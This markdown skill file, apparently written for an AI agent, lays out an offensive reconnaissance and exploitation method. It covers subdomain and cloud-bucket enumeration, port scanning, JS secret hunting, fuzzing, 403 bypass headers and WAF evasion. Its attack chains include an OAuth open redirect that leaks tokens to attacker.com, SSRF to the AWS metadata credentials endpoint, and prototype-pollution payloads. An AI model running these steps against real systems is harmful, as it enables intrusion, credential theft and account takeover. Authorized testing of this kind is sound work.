---
name: comprehensive_recon
description: reconnaissance and exploitation methodologies for advanced security assessments.
---

# Advanced Offensive Reconnaissance Methodology

This skill details an elite, deep-dive reconnaissance methodology going far beyond basic tool execution. It focuses on recursive enumeration, permutation, cloud asset discovery, and complex attack chaining.

## 1. Scope & OpSec (Critical)
> [!WARNING]
> This methodology generates significant traffic.
> - **Rate Limiting**: Use rotation (IP/User-Agent).
> - **WAF Evasion**: Randomize delays and headers.
> - **Verification**: Only attack authorized assets.

## 2. Infrastructure & Asset Discovery (The Hidden Layer)

### ASN & CIDR Expansion
Don't just scan domains; scan the infrastructure.
1.  **ASN Enumeration**: Find all IP ranges owned by the org.
    ```bash
    amass intel -org "Target Name"
    # Verify ownership with bgp.he.net
    ```
2.  **Vertical Domain Correlation**: Find related acquisitions/subsidiaries.
    -   `tools/whois-relation.py` (custom script to link registrant emails).

### Cloud Asset Discovery
1.  **S3/GCP/Azure Bucket Hunting**:
    ```bash
    # Permutation scanning based on keywords
    pwordlistgen -w keywords.txt | s3scanner
    ```
2.  **Cloud Function Enumeration**:
    -   Look for patterns like `*.cloudfunctions.net`, `*.azurewebsites.net`, `*.herokuapp.com` associated with the target.

## 3. Advanced Subdomain Enumeration (Recursive & Permutation)

### Recursive Layering
1.  **Passive**: `subfinder -d target.com -all`
2.  **Active Brute-force**:
    ```bash
    shuffledns -d target.com -w best-dns-wordlist.txt -r resolvers.txt
    ```
3.  **Permutation Scanning (The "Golden" Step)**:
    -   Take found subdomains and mutate them (dev-api -> prod-api, staging-v1 -> staging-v2).
    ```bash
    gotator -sub subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 > perm_subs.txt
    puredns resolve perm_subs.txt -r resolvers.txt
    ```
4.  **Recursive Scratching**: Run the entire process again on *newly found* subdomains (e.g., `dev.corp.target.com`).

## 4. Service & Port Discovery (Beyond 80/443)

### Comprehensive Port Scan
Don't miss dev ports (8080, 8443, 3000, 9000-9200).
```bash
naabu -list live_assets.txt -p - -exclude-cdn -nmap-cli 'nmap -sV -sC -O --script=vuln'
```
-   **Service Identification**: `httpx -sc -title -tech-detect -hash -favicon` (Hash favicons to find same technologies across different IPs).

## 5. Web Application Analysis (Deep Dive)

### JavaScript Analysis (The "Source Code" of Web)
1.  **Extraction**: Get all JS files.
    ```bash
    katana -u https://target.com -jc -d 5 | grep ".js$"
    ```
2.  **Secret Finding**:
    ```bash
    nuclei -l js_files.txt -t http/exposures/ -t http/misconfiguration/
    ```
3.  **Endpoint Extraction**:
    -   Extract all API endpoints hidden in JS (React/Vue/Angular routes).
    -   Build a custom wordlist from these endpoints for fuzzing.

### Content Discovery & Fuzzing
1.  **Context-Aware Fuzzing**:
    -   If WAF blocks 404s, calibrate fuzzers.
    -   Fuzz for backup files: `index.php.bak`, `.env`, `.git/HEAD`.
2.  **Parameter Fuzzing**:
    -   'Hidden' parameters often lead to IDOR or SSRF.
    ```bash
    arjun -u https://target.com/api/v1/user -m GET,POST,JSON
    ```

### 403/401 Bypass Techniques
When hitting a restricted endpoint:
-   **Headers**: `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`
-   **Path Manipulation**: `/admin/.`, `/admin%20`, `/admin;/`
-   **Methods**: Change `GET` to `POST` or `TRACE`.

## 6. Advanced Exploitation Chains

### Chain 1: Open Redirect -> Account Takeover (OAuth)
1.  Find Open Redirect: `https://target.com/login?next=http://attacker.com`
2.  Find OAuth flow: `https://target.com/auth/google?redirect_uri=...`
3.  **Chain**:
    -   `redirect_uri=https://target.com/login?next=http://attacker.com`
    -   If the OAuth token leaks in the URL fragment/query, the redirect sends it to `attacker.com`.

### Chain 2: SSRF -> Cloud Metadata -> RCE
1.  Find SSRF on a cloud-hosted app.
2.  **AWS**: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3.  Extract AWS Keys -> CLI Access -> S3/EC2 compromise.

### Chain 3: Prototype Pollution -> XSS / RCE
1.  Inject `__proto__[test]=1` in query params or JSON body.
2.  If reflected in `window.test`, try to pollute existing gadgets to cause XSS or even RCE in Node.js backends.

## 7. Reporting "Impact"
-   Don't just report "XSS". Report "Account Takeover via XSS on Admin Panel".
-   Don't just report "Information Disclosure". Report "PII Leak of 50k Users due to IDOR".
